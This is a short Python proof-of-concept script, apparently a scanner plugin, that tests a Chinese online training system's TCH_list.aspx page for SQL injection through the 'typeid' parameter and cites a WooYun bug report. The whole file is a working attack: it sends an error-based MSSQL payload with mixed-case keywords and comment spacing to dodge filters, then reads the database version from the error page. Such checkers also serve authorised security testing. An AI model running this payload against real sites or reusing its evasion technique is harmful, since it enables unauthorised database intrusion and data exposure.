#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 天柏在线培训系统TCH_list.aspx SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0143143
author: Lucifer
description: 文件TCH_list.aspx中,参数typeid存在SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['天柏在线培训系统TCH_list.aspx SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/Web_Org/TCH_list.aspx?typeid=9/**/AnD/**/1=CoNvErt(InT,ChAr(87)%2BChAr(116)%2BChAr(70)%2BChAr(97)%2BChAr(66)%2BChAr(99)%2B@@VeRsIoN)--"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"WtFaBcMicrosoft" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    